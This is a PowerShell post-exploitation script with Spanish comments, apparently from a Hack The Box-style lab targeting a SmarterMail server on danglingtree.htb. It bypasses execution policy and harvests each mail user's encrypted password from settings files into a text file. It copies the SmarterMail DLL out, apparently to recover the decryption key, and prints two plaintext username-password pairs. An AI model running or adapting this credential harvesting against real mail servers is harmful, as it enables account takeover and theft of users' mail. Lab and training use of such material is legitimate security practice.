# ============================================
# Script: 13_smartmail_enum.ps1
# Uso: powershell -ExecutionPolicy Bypass -File 13_smartmail_enum.ps1
# ============================================

Write-Host "=== Enumeración SmarterMail ===" -ForegroundColor Yellow

# 1. Enumerar usuarios en el dominio de SmarterMail
$domainPath = "C:\SmarterMail\Domains\danglingtree.htb.bak\Users"

if (Test-Path $domainPath) {
    Write-Host "[+] Enumerando usuarios de SmarterMail..." -ForegroundColor Green
    Get-ChildItem $domainPath | ForEach-Object {
        $user = $_.Name
        $settingsPath = Join-Path $_.FullName "settings.json"
        if (Test-Path $settingsPath) {
            $content = Get-Content $settingsPath | ConvertFrom-Json
            Write-Host "[*] Usuario: $user"
            if ($content.password_encrypted) {
                Write-Host "    Contraseña cifrada: $($content.password_encrypted)" -ForegroundColor Yellow
                # Guardar para descifrar después
                Add-Content -Path "C:\temp\encrypted_passwords.txt" -Value "$user:$($content.password_encrypted)"
            }
        }
    }
}

# 2. Verificar archivos de configuración
Write-Host ""
Write-Host "[+] Verificando archivos de configuración..." -ForegroundColor Green
$configFiles = @(
    "C:\SmarterMail\Domains\danglingtree.htb.bak\Settings.json",
    "C:\SmarterMail\Configuration\SmarterMail.config",
    "C:\Program Files (x86)\SmarterTools\SmarterMail\Service\SmarterMail.Standard.dll"
)

foreach ($file in $configFiles) {
    if (Test-Path $file) {
        Write-Host "[*] $file" -ForegroundColor Green
    } else {
        Write-Host "[!] $file no encontrado" -ForegroundColor Red
    }
}

# 3. Copiar DLL para análisis
Write-Host ""
Write-Host "[+] Copiando SmarterMail.Standard.dll para análisis..." -ForegroundColor Green
$dllPath = "C:\Program Files (x86)\SmarterTools\SmarterMail\Service\SmarterMail.Standard.dll"
if (Test-Path $dllPath) {
    Copy-Item $dllPath -Destination "C:\temp\" -Force
    Write-Host "[✓] DLL copiada a C:\temp\SmarterMail.Standard.dll" -ForegroundColor Green
}

# 4. Mostrar resumen
Write-Host ""
Write-Host "=== Resumen ===" -ForegroundColor Yellow
Write-Host "1. Contraseñas cifradas guardadas en: C:\temp\encrypted_passwords.txt"
Write-Host "2. DLL copiada a: C:\temp\SmarterMail.Standard.dll"
Write-Host "3. Usa CyberChef o el script decrypt.py para descifrar"
Write-Host "4. Credenciales obtenidas:"
Write-Host "   - noah.b: RiverDragon#Storm25"
Write-Host "   - alex.o: SunsetMountainPeak@2025"
